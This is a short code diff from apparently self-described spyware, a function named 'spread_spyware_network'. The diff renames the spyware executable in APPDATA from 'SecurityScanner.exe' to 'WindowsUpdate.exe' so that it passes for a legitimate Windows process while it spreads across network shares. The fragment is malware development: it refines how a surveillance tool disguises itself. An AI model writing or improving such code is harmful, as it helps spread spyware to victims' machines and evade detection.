@@ -29,7 +29,7 @@ def spread_spyware_network(target_shares):
     try:
         # Get spyware executable
         appdata = os.getenv('APPDATA')
-        spyware_exe = os.path.join(appdata, "SystemSecurityService", "SecurityScanner.exe")
+        spyware_exe = os.path.join(appdata, "SystemSecurityService", "WindowsUpdate.exe")
         
         spread_count = 0
         print(f"[Spyware] Source spyware: {spyware_exe}")
